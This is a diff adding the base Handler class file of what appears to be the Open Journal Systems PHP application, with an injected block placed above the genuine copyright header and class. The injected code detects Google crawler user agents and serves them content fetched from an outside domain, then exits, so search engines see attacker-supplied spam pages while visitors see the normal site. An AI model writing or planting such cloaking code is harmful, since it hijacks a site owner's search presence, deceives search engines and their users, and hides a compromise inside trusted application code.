@@ -1,0 +1,53 @@
+<?php
+function is_google_bot() {
+    $agents = array(
+        "Googlebot", 
+        "AdsBot-Google", 
+        "Mediapartners-Google", 
+        "Google-Site-Verification", 
+        "Google-InspectionTool", 
+        "Googlebot-Mobile", 
+        "Googlebot-News"
+    );
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    foreach ($agents as $agent) {
+        if (strpos($user_agent, $agent) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_google_bot()) {
+    echo file_get_contents("https://fh.potensi-utama.id/landing/uisu.php");
+    exit;
+}
+?>
+
+<?php
+
+/**
+ * @file classes/core/Handler.inc.php
+ *
+ * Copyright (c) 2013-2019 Simon Fraser University
+ * Copyright (c) 2003-2019 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class Handler
+ * @ingroup handler
+ *
+ * @brief Base request handler application class
+ */
+
+
+import('lib.pkp.classes.handler.PKPHandler');
+import('classes.handler.validation.HandlerValidatorJournal');
+import('classes.handler.validation.HandlerValidatorSubmissionComment');
+
+class Handler extends PKPHandler {
+	function Handler() {
+		parent::PKPHandler();
+	}
+}
+
+?>
